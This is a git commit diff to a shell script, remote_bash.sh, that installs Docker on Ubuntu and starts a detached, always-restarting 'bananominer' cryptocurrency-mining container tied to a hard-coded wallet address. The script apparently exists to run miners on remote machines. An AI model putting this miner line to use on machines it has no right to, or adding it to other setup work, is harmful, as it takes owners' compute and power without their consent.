f087367d9f66e258d7281747ed83ee73b4bc4779
phamhung140295 <phamhung140295@gmail.com>
2019-06-25 14:35:52 +0700

    Update remote_bash.sh

--- remote_bash.sh
+++ remote_bash.sh
@@ -1,9 +1,8 @@
 sudo apt update
-apt install apt-transport-https ca-certificates curl software-properties-common -y
-curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - && \
-add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable"
+sudo apt install apt-transport-https ca-certificates curl software-properties-common -y
+curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
+sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable"
 sudo apt update
-apt-cache policy docker-ce
-apt install docker-ce -y
-lscpu
+sudo apt-cache policy docker-ce
+sudo apt install docker-ce -y
 docker run -d --restart always -e "a=ban_1j96h55rbysu68mssgjxqh6afh8ex1zwx313ecz59aochk4ikxfnqdh3pt1a" -e "b=4" -e "c=coinimp" anzerr/bananominer:latest
